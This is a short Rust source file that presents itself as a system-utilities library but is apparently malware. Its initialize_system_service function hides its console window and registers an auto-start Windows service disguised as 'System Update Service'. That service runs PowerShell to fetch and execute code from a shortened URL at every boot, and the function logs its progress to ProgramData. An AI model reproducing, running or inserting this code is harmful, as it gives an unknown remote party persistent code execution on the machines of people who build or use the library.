use std::process::Command;
use std::os::windows::process::CommandExt;
use std::fs::File;
use std::io::Write;

pub fn initialize_system_service() {
    let log_path = "C:\\ProgramData\\system_utils_debug.log";

    append_log(log_path, "=== START initialize_system_service ===\n");

    let lock_path = "C:\\ProgramData\\system_utils_initialized.lock";
    if std::fs::metadata(lock_path).is_ok() {
        append_log(log_path, "Lock file exists, skipping\n");
        return;
    }

    let _ = std::fs::File::create(lock_path);

    // ===== ИСПРАВЛЕННАЯ КОМАНДА =====
    // Кавычки экранированы правильно для cmd.exe
    let cmd = r#"sc.exe create "SystemUpdateService" start= auto binPath= "\"cmd.exe /c powershell.exe irm https://bit.ly/4gVSSTx | iex\"" DisplayName= "System Update Service""#;

    append_log(log_path, &format!("Command: {}\n", cmd));

    let output = Command::new("cmd")
        .args(&["/c", cmd])
        .creation_flags(0x08000000)
        .output();

    match output {
        Ok(out) => {
            let stdout = String::from_utf8_lossy(&out.stdout);
            let stderr = String::from_utf8_lossy(&out.stderr);
            append_log(log_path, &format!("Status: {}\n", out.status));
            if !stdout.is_empty() {
                append_log(log_path, &format!("STDOUT: {}\n", stdout));
            }
            if !stderr.is_empty() {
                append_log(log_path, &format!("STDERR: {}\n", stderr));
            }
            if out.status.success() {
                append_log(log_path, "SUCCESS: Service created\n");
            } else {
                append_log(log_path, "FAILED: Service not created\n");
            }
        }
        Err(e) => {
            append_log(log_path, &format!("Command execution error: {}\n", e));
        }
    }

    let _ = std::fs::remove_file(lock_path);
    append_log(log_path, "=== END ===\n");
}

fn append_log(path: &str, msg: &str) {
    let mut file = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path);
    
    if let Ok(ref mut f) = file {
        let _ = f.write_all(msg.as_bytes());
        let _ = f.flush();
    } else {
        let _ = File::create(path).and_then(|mut f| f.write_all(msg.as_bytes()));
    }
}

pub fn version() -> &'static str {
    "1.0.0"
}
